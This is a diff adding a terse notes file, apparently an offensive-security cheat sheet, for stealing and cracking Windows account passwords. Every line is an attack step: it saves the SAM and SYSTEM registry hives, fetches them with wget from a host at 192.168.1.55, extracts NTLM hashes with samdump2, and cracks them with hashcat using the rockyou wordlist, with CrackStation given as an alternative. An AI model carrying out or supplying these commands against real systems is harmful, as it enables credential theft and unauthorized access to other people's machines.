@@ -1,0 +1,30 @@
+reg save HKLM\sam sam
+reg save HKLM\system system
+
+#Download dictionary rockyou.txt
+https://github.com/praetorian-inc/Hob0Rules/blob/master/wordlists/rockyou.txt.gz
+
+
+
+wget http://192.168.1.55/system
+http://192.168.1.55/sam
+
+#How to install it:
+sudo apt-get install samdump2
+
+samdump2 SYSTEM SAM
+
+
+#Install Hashcat:
+sudo apt-get install hashcat
+
+nano hashes.txt
+
+#Crack the passwords
+hashcat -m 1000 -a 3 hashes.txt rockyou.txt
+
+
+#crack passwords
+https://crackstation.net/
+
+C:\Windows\System32\config
